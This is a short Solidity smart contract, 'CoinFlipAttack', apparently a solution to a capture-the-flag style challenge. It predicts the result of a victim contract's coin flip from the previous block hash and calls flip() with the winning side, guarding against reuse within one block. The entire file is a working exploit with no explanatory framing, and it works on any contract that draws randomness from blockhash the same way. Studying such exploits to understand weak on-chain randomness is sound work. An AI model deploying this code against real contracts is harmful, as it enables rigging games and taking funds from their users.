// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface CoinFlipInterface {
    function flip(bool) external returns (bool);
}

contract CoinFlipAttack {
    address public attacker;

    uint256 private lastHash;
    uint256 private FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    bool public success;

    constructor() {
        attacker = msg.sender;
    }

    modifier onlyAttacker() {
        require(msg.sender == attacker, "CoinFlipAttack: NOT_OWNER");
        _;
    }

    function attack(address _victim) external onlyAttacker {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        CoinFlipInterface coinflipInstance = CoinFlipInterface(_victim);

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        success = coinflipInstance.flip(side);
    }
}
